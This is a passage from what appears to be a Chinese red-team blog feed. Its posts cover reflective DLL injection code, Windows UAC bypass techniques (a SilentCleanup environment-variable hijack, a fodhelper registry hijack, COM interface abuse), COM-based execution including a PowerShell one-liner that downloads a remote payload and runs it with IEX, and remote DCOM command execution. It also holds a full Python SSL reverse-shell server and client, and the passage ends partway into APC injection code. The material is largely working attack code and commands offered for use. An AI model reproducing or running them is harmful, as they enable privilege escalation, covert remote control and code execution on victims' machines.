BREAK_WITH_ERROR( &quot;Failed to open the DLL file&quot; );        dwLength = GetFileSize( hFile, NULL ); //获取文件大小        if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )            BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );        lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength ); //从堆分配一块内存 (GetProcessHeap() 检索到调用进程的默认堆的句柄)        if( !lpBuffer )            BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );        if( ReadFile( hFile, lpBuffer, dwLength, &amp;dwBytesRead, NULL ) == FALSE ) //读取文件            BREAK_WITH_ERROR( &quot;Failed to alloc a buffer!&quot; );        if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) ) //获取当前token句柄        {            priv.PrivilegeCount           = 1;            priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;            if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;priv.Privileges[0].Luid ) )                AdjustTokenPrivileges( hToken, FALSE, &amp;priv, 0, NULL, NULL );            CloseHandle( hToken );        }        hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );        if( !hProcess )            BREAK_WITH_ERROR( &quot;Failed to open the target process&quot; );        hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL ); //hProcess=&gt;进程句柄，lpBuffer=&gt;堆内存空间，dwlength=&gt;dll文件大小        if( !hModule )            BREAK_WITH_ERROR( &quot;Failed to inject the DLL&quot; );        printf( &quot;[+] Injected the &#39;%s&#39; DLL into process %d.&quot;, cpDllFile, dwProcessId );        WaitForSingleObject( hModule, -1 );    } while( 0 );    if( lpBuffer )        HeapFree( GetProcessHeap(), 0, lpBuffer );    if( hProcess )        CloseHandle( hProcess );    return 0;}</code></pre><p>整个流程如下：</p><ul><li>首先判断命令行参数总数量是否只有一个,如果命令行参数大于或等于三，则dwProcessId为指定PID<ul><li>dwProcessId为当前进程PID</li></ul></li><li>CreateFileA读取对应的DLL</li><li>GetFileSize获取DLL文件大小</li><li>HeapAlloc从堆分配一块内存 （这里使用GetProcessHeap，检索到调用进程的默认堆的句柄）</li><li>ReadFile读取DLL</li><li>OpenProcessToken当前TOKEN</li><li>OpenProcess打开进程</li><li>调用LoadLibraryR.c里的LoadRemoteLibrary函数dll注入<ul><li>GetReflectiveLoaderOffset返回对应PE位数的地址</li><li>VirtualAllocEx分配内存</li><li>WriteProcessMemory内存数据写入</li><li>CreateRemoteThread创建远程进程</li></ul></li></ul><p>LoadRemoteLibraryR</p><pre><code class="C">HANDLE WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter ) //hProcess=&gt;进程句柄，lpBuffer=&gt;堆内存空间，dwlength=&gt;dll文件大小{    BOOL bSuccess                             = FALSE;    LPVOID lpRemoteLibraryBuffer              = NULL;    LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;    HANDLE hThread                            = NULL;    DWORD dwReflectiveLoaderOffset            = 0;    DWORD dwThreadId                          = 0;    __try    {        do        {            if( !hProcess  || !lpBuffer || !dwLength )                break;            // check if the library has a ReflectiveLoader...            dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer ); //自定义的GetReflectiveLoaderOffset函数            if( !dwReflectiveLoaderOffset )                break;            // alloc memory (RWX) in the host process for the image...            lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );             if( !lpRemoteLibraryBuffer )                break;            // write the image into the host process...            if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) ) //写入内存                break;            // add the offset to ReflectiveLoader() to the remote library address...            lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );            // create a remote thread in the host process to call the ReflectiveLoader!            hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &amp;dwThreadId ); //创建远程线程        } while( 0 );    }    __except( EXCEPTION_EXECUTE_HANDLER )    {        hThread = NULL;    }    return hThread;}</code></pre><p>GetReflectiveLoaderOffset函数 （返回对应的位数和地址）</p><pre><code class="c">DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer ){    UINT_PTR uiBaseAddress   = 0;    UINT_PTR uiExportDir     = 0;    UINT_PTR uiNameArray     = 0;    UINT_PTR uiAddressArray  = 0;    UINT_PTR uiNameOrdinals  = 0;    DWORD dwCounter          = 0;#ifdef WIN_X64    DWORD dwCompiledArch = 2;#else    // This will catch Win32 and WinRT.    DWORD dwCompiledArch = 1;#endif    uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;    // get the File Offset of the modules NT Header    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;    // currenlty we can only process a PE file which is the same type as the one this fuction has      // been compiled as, due to various offset in the PE structures being defined at compile time.    if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == 0x010B ) // PE32    {        if( dwCompiledArch != 1 )            return 0;    }    else if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == 0x020B ) // PE64    {        if( dwCompiledArch != 2 )            return 0;    }    else    {        return 0;    }    // uiNameArray = the address of the modules export directory entry    uiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];    // get the File Offset of the export directory    uiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );    // get the File Offset for the array of name pointers    uiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );    // get the File Offset for the array of addresses    uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );    // get the File Offset for the array of name ordinals    uiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );        // get a counter for the number of exported functions...    dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;    // loop through all the exported functions to find the ReflectiveLoader    while( dwCounter-- )    {        char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));        if( strstr( cpExportedFunctionName, &quot;ReflectiveLoader&quot; ) != NULL )        {            // get the File Offset for the array of addresses            uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );                // use the functions name ordinal as an index into the array of name pointers            uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );            // return the File Offset to the ReflectiveLoader() functions code...            return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );        }        // get the next exported function name        uiNameArray += sizeof(DWORD);        // get the next exported function name ordinal        uiNameOrdinals += sizeof(WORD);    }    return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/10/19/0vq59I.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bypass UAC研究</title>
      <link href="/posts/70084607.html"/>
      <url>/posts/70084607.html</url>
      <content type="html"><![CDATA[<p>水了一天，明天出发准备上学。先去玩几天，早上原本就打算写<br>刷b站硬是刷到了晚上</p><h2 id="UAC是何物"><a href="#UAC是何物" class="headerlink" title="UAC是何物"></a>UAC是何物</h2><blockquote><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为”恶意软件”）损坏系统的效果。<br>主要用于隔离administrator和user的权限<br><img src="https://s1.ax1x.com/2020/10/08/0wPgn1.png" alt=""></p></blockquote><p>高:<br>任何程序启动都需要申请</p><p>默认：<br>UAC在不手动更改的情况下，程序需要administrator权限的时候。会弹出框框申请</p><p>中:<br>申请administrator权限不弹出申请框框，默认允许</p><p>从不提醒：<br>所有程序启动皆为administrator权限</p><h2 id="bypass-UAC的要求"><a href="#bypass-UAC的要求" class="headerlink" title="bypass UAC的要求"></a>bypass UAC的要求</h2><p>UAC设置为默认或更低<br>低权用户有权限执行的（可以是COM，计划任务，dll劫持等）</p><h2 id="交互式bypass"><a href="#交互式bypass" class="headerlink" title="交互式bypass"></a>交互式bypass</h2><p>例如：执行了MMC，然后在MMC打开文件选项选择cmd.exe执行<br><img src="https://s1.ax1x.com/2020/10/08/0wiWKs.png" alt=""></p><p>利用权限继承，在一个有administrator权限的进程里执行另外的进程从而实现绕过UAC<br>但是这种始终无法真正的利用</p><h2 id="方式一：利用自带的计划任务"><a href="#方式一：利用自带的计划任务" class="headerlink" title="方式一：利用自带的计划任务"></a>方式一：利用自带的计划任务</h2><p>\Microsoft\Windows\DiskCleanup\SilentCleanup计划任务</p><pre><code># cmdsetx windir cmd /kschtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /Ior# powershellNew-ItemProperty &quot;HKCU:\Environment&quot; -Name &quot;windir&quot; -Value &quot;cmd.exe /k cmd.exe&quot; -PropertyType String -Force #用户环境变量注册表schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I</code></pre><p>原因：\Microsoft\Windows\DiskCleanup\SilentCleanup服务以administrator运行，且计划任务任何用户都可以启动。启动程序使用用户变量%windir%这样去执行程序，通过修改用户变量课可实现bypass UAC<br><img src="https://s1.ax1x.com/2020/10/08/0wiHGF.png" alt=""></p><p>计划任务的设置如下<br><img src="https://s1.ax1x.com/2020/10/08/0wiOM9.png" alt=""></p><p>执行的操作<br><img src="https://s1.ax1x.com/2020/10/08/0wFSIK.png" alt=""></p><h2 id="方法二：程序以高权执行某些进程"><a href="#方法二：程序以高权执行某些进程" class="headerlink" title="方法二：程序以高权执行某些进程"></a>方法二：程序以高权执行某些进程</h2><p>例如：<br>fodhelper.exe和computerdefaults.exe存在bypass UAC</p><pre><code># powershellNew-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -ForceNew-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -ForceSet-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value cmd.exe -ForceStart-Process &quot;C:\Windows\System32\fodhelper.exe&quot;Remove-Item &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Forceor# cmdreg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d &quot;&quot;reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d cmd.exefodhelper.exereg delete HKCU\Software\Classes\ms-settings\ /F</code></pre><p><img src="https://s1.ax1x.com/2020/10/08/0wFCGD.png" alt=""></p><p>通过进程监测可以看到如下过程<br><img src="https://s1.ax1x.com/2020/10/08/0wFPRe.png" alt=""></p><p>首先寻找了</p><pre><code>HKCU\Software\Classes\ms-settings\Shell\Open\command key:(Default)</code></pre><p>然后在寻找了</p><pre><code>HKCU\Software\Classes\ms-settings\Shell\Open\command key:DelegateExecute</code></pre><p>当HKCU\Software\Classes\ms-settings\Shell\Open\command路径找不到的时候才去找HKCR\ms-settings\Classes\ms-settings\Shell\Open\command<br><img src="https://s1.ax1x.com/2020/10/08/0wF6dx.png" alt=""></p><p>Shell\Open\Command默认键名(Default)为所执行的程序,DelegateExecute为对应COM接口的CLSID<br><img src="https://s1.ax1x.com/2020/10/08/0wF2FK.png" alt=""></p><h2 id="方法三：COM接口函数劫持"><a href="#方法三：COM接口函数劫持" class="headerlink" title="方法三：COM接口函数劫持"></a>方法三：COM接口函数劫持</h2><p>COM接口劫持需要先找到一些在system32目录下的dll，一般都是系统自带的COM接口<br>然后从这些接口里寻找可用的函数，例如：cmdlua.dll里的shellExecW，GUID：3E5FC7F9-9A51-4367-9063-A120244FBEC7<br>OleViewDotNet（Administrator权限运行）查询对应的CLSID<br><img src="https://s1.ax1x.com/2020/10/08/0wFxyj.png" alt=""></p><p>然后跟踪这个ICMLuaUtil接口可以看到下面的函数<br><img src="https://s1.ax1x.com/2020/10/08/0wkZ6J.png" alt=""></p><p>IDA反编译对应的DLL通过虚函数表搜索地址/搜索关键字ICMLuaUtil可以看到下面的函数<br>从0开始数到9，shellExec正好对应Proc9<br><img src="https://s1.ax1x.com/2020/10/08/0wkKTx.png" alt=""></p><p>然后只需要编写调用COM接口即可<br>注意：这里CPP定义的接口函数数量和IDA反编译出来的数量一样（除了要调用的函数）<br><img src="https://s1.ax1x.com/2020/10/08/0wkYXd.png" alt=""></p><p>编译好对应的dll后，使用rundll32调用效果如下<br><img src="https://s1.ax1x.com/2020/10/08/0wka7t.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果是劫持环境变量，从计划任务找bypass UAC的话注意两点： （只适用于 windows10，windows7或以下的在设置计划任务的时候，环境变量是什么就一直是那个环境变量的值，不会在改变。除非删除任务重新弄）</p><ul><li>计划任务状态为非禁用</li><li>计划任务的触发器为:启动程序 (其他的话要按照对应的触发器是触发)</li><li>详细信息的里路径程序带参数，且参数用户的用户环境变量</li></ul><p>COM接口劫持需要先找到一些在system32目录下的dll，一般都是系统自带的COM接口<br>然后从这些接口里寻找可用的函数</p><p>一般利用COM都是自动化搜索然后人工审计多</p><p>DLL劫持因为时间问题暂时没复现</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://swapcontext.blogspot.com/2020/10/uacme-35-wd-and-ways-of-mitigation.html?m=1" target="_blank" rel="noopener">https://swapcontext.blogspot.com/2020/10/uacme-35-wd-and-ways-of-mitigation.html?m=1</a><br><a href="https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz" target="_blank" rel="noopener">https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz</a><br>COM劫持代码来源：<a href="https://www.write-bug.com/article/2000.html" target="_blank" rel="noopener">https://www.write-bug.com/article/2000.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>COM接口学习与利用</title>
      <link href="/posts/ed9cc210.html"/>
      <url>/posts/ed9cc210.html</url>
      <content type="html"><![CDATA[<h2 id="何为COM"><a href="#何为COM" class="headerlink" title="何为COM"></a>何为COM</h2><p>OM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。由此带来的好处是多方面的：可以将系统中的组件用新的替换掉，以便随时进行系统的升级和定制；可以在多个应用系统中重复利用同一个组件；可以方便的将应用系统扩展到网络环境下；COM与语言，平台无关的特性使所有的程序员均可充分发挥自己的才智与专长编写组件模块。</p><p>找了篇文章编写了一个COM接口<br>参考链接:<a href="https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html</a><br>COM接口里有个calc函数<br><img src="https://s1.ax1x.com/2020/10/03/01Qete.png" alt=""></p><p>生成DLL后，用regsvr32注册完后，可以在HKEY_CLASSES_ROOT\CLSID\下可以见到注册好的dll<br><img src="https://s1.ax1x.com/2020/10/03/01QmfH.md.png" alt=""></p><p>使用powershell可以查询对应COM的可用函数</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;20CE411F-4415-4017-B797-66AE3B8C9A4D&quot;)) #枚举对于appid可用的函数$obj | get-member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QK1A.png" alt=""></p><p>调用对应COM接口的函数</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;20CE411F-4415-4017-B797-66AE3B8C9A4D&quot;))$handle.calc()</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01Q30f.png" alt=""></p><h2 id="注册表路径说明"><a href="#注册表路径说明" class="headerlink" title="注册表路径说明"></a>注册表路径说明</h2><p>HKEY_CLASSES_ROOT\CLSID 所有COM接口对应的CLSID都在这个项或子项下<br><img src="https://s1.ax1x.com/2020/10/03/01QYtg.png" alt=""></p><p>CLSID项下场见的子项</p><pre><code>* lnprocServer32* TypeLib* version* progID</code></pre><p>lnprocServer32写着这个COM接口处理的dll<br><img src="https://s1.ax1x.com/2020/10/03/01QUpj.png" alt=""></p><p>InprocServer32写着接口的信息/版本<br><img src="https://s1.ax1x.com/2020/10/03/01Qdcn.png" alt=""></p><h2 id="枚举机器上所有的CLSID"><a href="#枚举机器上所有的CLSID" class="headerlink" title="枚举机器上所有的CLSID"></a>枚举机器上所有的CLSID</h2><p>指定类名为WIN32_DCOMApplication</p><pre><code>Get-CimInstance -ClassName WIN32_DCOMApplication</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QwXq.png" alt=""></p><p>Get-CimInstance （简写：Get-cim）作用：从CIM服务器获取类的CIM实例<br><img src="https://s1.ax1x.com/2020/10/03/01QBn0.png" alt=""></p><p>CIM：公共信息模型（CIM）是用于描述受管理资源（如存储，网络或软件组件）的结构和行为的DMTF标准[DSP0004]。</p><p>查询指定CLSID可用函数</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C5EDFC9D-B018-41A4-9877-39AB18469C3A&quot;))$obj | get-member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QDBV.png" alt=""></p><p>快速提起所有CLSID和对应的CLSID里的函数</p><pre><code>Get-CimInstance -ClassName WIN32_DCOMApplication | Select-Object appid | out-file clsids.txt$Position  = 1$Filename = &quot;win10-clsid-members.txt&quot;$inputFilename = &quot;clsids.txt&quot;ForEach($CLSID in Get-Content $inputFilename) {      Write-Output &quot;$($Position) - $($CLSID)&quot;      Write-Output &quot;------------------------&quot; | Out-File $Filename -Append      Write-Output $($CLSID) | Out-File $Filename -Append      $handle = [activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))      $handle | Get-Member | Out-File $Filename -Append      $Position += 1}</code></pre><p>（Method为方法，Property为参数设置之类的）<br><img src="https://s1.ax1x.com/2020/10/03/01QTAO.md.png" alt=""></p><p>枚举某个Application</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Excel.Application&quot;))  $obj | Get-Member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QH4e.png" alt=""></p><p>属性继续枚举</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;49B2791A-B1AE-4C90-9B8E-E860BA07F889&quot;))$obj.Document | Get-Member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QL3d.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01Qvut.png" alt=""></p><h2 id="寻找可利用的COM接口"><a href="#寻找可利用的COM接口" class="headerlink" title="寻找可利用的COM接口"></a>寻找可利用的COM接口</h2><p>对应的CLSID是MMC.exe（那么是否代表着系统自带的程序可以执行命令的话，可以找找一个COM接口的函数），如果是不开源的话只能用IDA或Oleview.exe反编译了<br><img src="https://s1.ax1x.com/2020/10/03/01QzHf.md.png" alt=""></p><p>COM接口里枚举出来的函数（如果是微软公开的话）可以到：<a href="https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=</a> 搜索<br>例如：ExecuteShellCommand <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand</a><br><img src="https://s1.ax1x.com/2020/10/03/01l9US.png" alt=""></p><p>调用函数（注意:如果注册表查询CLSID子项带有ProgID的话需要指定ProgID调用方法或属性）<br><img src="https://s1.ax1x.com/2020/10/03/01lC4g.png" alt=""></p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;))$handle.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lkgs.png" alt=""></p><p>思考：能不能通过微软文档搜索比如什么：Exec,command,file.urldownload这些函数，如果找的到在CLSID项里搜索对应的exe/dll，然后调用呢。或在HKEY_CLASSES_ROOT\CLSID下寻找有ProgID的子项CLSID，寻找可利用项。为什么要找带有ProgID子项的CLSID？因为这些一般都是系统自带的</p><h2 id="利用COM接口"><a href="#利用COM接口" class="headerlink" title="利用COM接口"></a>利用COM接口</h2><p>可以根据对应COM接口枚举出的函数名进行分析，或者猜解。例如</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;00020906-0000-0000-C000-000000000046&quot;))$handle.ExecuteExcel4Macro(&quot;EXEC(&quot;&quot;calc.exe&quot;&quot;)&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lK5F.png" alt=""></p><blockquote><p>比如，F5078F35-C551-11D3-89B9-0000F81FE221}这个COM对象（Msxml2.XMLHTTP.3.0）对外提供了一个XML HTTP 3.0功能，可以用来下载任意代码并执行，无需将payload写入磁盘，也不会触发基于System.Net.WebClient的常用检测规则。XML HTTP 3.0对象通常用来发起AJAX请求。在这种情况下，获取数据的方式非常简单，直接使用Invoke-Expression cmdlet（IEX）即可。</p></blockquote><pre><code>$o = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;));$o.Open(&quot;GET&quot;, &quot;http://192.168.1.106/payload.txt&quot;, $False);$o.Send();IEX $o.responseText;</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01l129.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01l3vR.png" alt=""></p><p>对应的open函数反汇编<br><img src="https://s1.ax1x.com/2020/10/03/01lGK1.png" alt=""></p><p>文章里有用 Oleview.exe进行对dll的反编译，也有用IDA对指定DLL的函数进行分析。需要一定的基础进行分析<br>COM的利用方式：</p><pre><code>* 寻找COM接口对应注册表的lnprocServer32缺少的dll/exe替换进行提权* 利用COM接口远程调用</code></pre><p>COM远程利用：</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.113.130&quot;))$handle.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lJDx.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01lYb6.md.png" alt=""></p><p>参考链接:<br><a href="https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html</a><br><a href="https://www.anquanke.com/post/id/217928" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217928</a><br><a href="https://www.anquanke.com/post/id/179927" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179927</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ssl反弹shell(py)</title>
      <link href="/posts/aa01a75d.html"/>
      <url>/posts/aa01a75d.html</url>
      <content type="html"><![CDATA[<p>之前在星球发过一个py反弹windows shell的。昨天看了篇py ssl反弹shell的<br>想着把之前那个也改一下</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>openssl生成证书</p><pre><code>openssl genrsa -out server.key 1024openssl req -new -x509 -days 3650 -key server.key -out server.crt -subj &quot;/C=CN/ST=mykey/L=mykey/O=mykey/OU=mykey/CN=domain1/CN=domain2/CN=domain3&quot;</code></pre><p>server：</p><pre><code class="python">import socketimport sslimport optparseimport osdef main(ip,port,cert,key):    try:        port=int(port)    except:        print(&quot;[-] set port 1-65535&quot;)        exit()    if os.path.exists(cert) and os.path.exists(key):        pass    else:        print(&quot;[-] ssl cert:{} or ssl key:{} not found&quot;.format(cert,key))        exit()    print(&quot;bind {}:{}&quot;.format(ip,port))    s=socket.socket()    ssl_s=ssl.wrap_socket(s,certfile=cert,keyfile=key,                          ssl_version=ssl.PROTOCOL_TLSv1)    ssl_s.bind((str(ip),port))    ssl_s.listen(3)    conn, addr = ssl_s.accept()    print(&quot;[+] connection {}&quot;.format(addr))    while True:        user = input()        if len(user)&gt;0:            conn.sendall(user.encode())        else:            continue        data=b&quot;&quot;        cmdlen = conn.recv(99999)        cmdlen=int(cmdlen)        while len(data)&lt;cmdlen:            data+=conn.recv(99999)        print(data.decode())if __name__ == &#39;__main__&#39;:    parser=optparse.OptionParser()    parser.add_option(&quot;-i&quot;,dest=&quot;ip&quot;,help=&quot;set ip&quot;)    parser.add_option(&quot;-p&quot;,dest=&quot;port&quot;,help=&quot;set port&quot;)    parser.add_option(&quot;-c&quot;,dest=&quot;cert&quot;,help=&quot;set ssl cert&quot;)    parser.add_option(&quot;-k&quot;,dest=&quot;key&quot;,help=&quot;set ssl key&quot;)    option,args=parser.parse_args()    if option.ip and option.port and option.cert and option.key:        main(option.ip,option.port,option.cert,option.key)    else:        parser.print_help()        print(&quot;Example:python server.py -i &lt;ip&gt; -p &lt;port&gt; -c &lt;sslcert&gt; -k &lt;sslkey&gt;&quot;)</code></pre><p>client.py</p><pre><code class="py">import socketimport osimport reimport ssls=socket.socket()s=ssl.wrap_socket(s,ssl_version=ssl.PROTOCOL_TLSv1)s.connect((&quot;192.168.113.145&quot;,4444))while True:    path=os.getcwd()    data=s.recv(1024).decode().rstrip(&#39;\n&#39;)    if len(data)&gt;0:        data=&quot;cd /d {}&amp;&quot;.format(os.getcwd())+data+&quot;&amp;echo [S]&amp;cd&amp;echo [E]&quot;        cmd = os.popen(data).read()        path2 = re.findall(&quot;\[S\]\n.*\n\[E\]&quot;, cmd)        if len(path2) &gt; 0:            path = str(path2[0]).replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;[S]&quot;, &quot;&quot;).replace(&quot;[E]&quot;, &quot;&quot;)            os.chdir(path)        cmd=re.sub(&quot;\[S\]\n.*\n\[E\]&quot;,&quot;&quot;,cmd)        sed=cmd+path+&quot;&gt;&quot;        cmd_length=str(len(sed.encode(&quot;utf-8&quot;))).encode()        cmd_data=sed.encode(&quot;utf-8&quot;)        s.sendall(cmd_length)        s.sendall(cmd_data)    else:        s.sendall(path.encode(&quot;utf-8&quot;))</code></pre><p>效果如下：<br><img src="https://s1.ax1x.com/2020/09/25/09dPJS.png" alt="09dPJS.png"><br><img src="https://s1.ax1x.com/2020/09/25/09diRg.png" alt="09diRg.png"></p><p>找个时间写个golang的</p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>APC dll注入</title>
      <link href="/posts/c9faf9c0.html"/>
      <url>/posts/c9faf9c0.html</url>
      <content type="html"><![CDATA[<h2 id="原理和要求"><a href="#原理和要求" class="headerlink" title="原理和要求"></a>原理和要求</h2><p>APC注入原理：<br>APC注入的原理是利用线程被唤醒时APC中的主从函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入。</p><p>APC注入要求：</p><pre><code>1.必须是多线程环境下2.注入的程序必须会调用上面的那些同步对象.那么我们可以注入APC,注意下条件,也不是所有都能注入的.注入方法的原理:1.当对面程序执行到某一个上面的等待函数的时候,系统会产生一个中断2.当线程唤醒的时候,这个线程会优先去Apc队列中调用回调函数3.我们利用QueueUserApc,往这个队列中插入一个回调4.插入回调的时候,把插入的回调地址改为LoadLibrary,插入的参数我们使用VirtualAllocEx申请内存,并且写入进去</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><pre><code class="c">#include &quot;stdafx.h&quot;#include&lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;iostream&gt;#include &lt;string&gt;void GetErr() {        printf(&quot;Error:%d&quot;, GetLastError());        printf(&quot;\n&quot;);        exit(1);}int getprocess(WCHAR *processname) {        HANDLE  data = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);        if (data == INVALID_HANDLE_VALUE) {               printf(&quot;[-] CreateToolhelp32Snapshot failure&quot;);               GetErr();        }        else {               PROCESSENTRY32W pe = { sizeof(pe) };               printf(&quot;[*] CreateToolhelp32Snapshot Sucess\n&quot;);               for (bool dd = Process32FirstW(data, &amp;pe);dd;dd = Process32NextW(data,  &amp;pe)) {                       WCHAR *pname = pe.szExeFile;                       int pid = pe.th32ProcessID;                       if (wcscmp(processname, pname) == 0) {                              WCHAR info[650] =TEXT(&quot;name:&quot;);                              lstrcatW(info, pname);                              lstrcatW(info, TEXT(&quot; &quot;));                              wprintf(info);                              wprintf(TEXT(&quot;pid:&quot;));                              printf(&quot;%d\n&quot;, pid);                              return pid;                       }               }        }        return 0;}BOOL 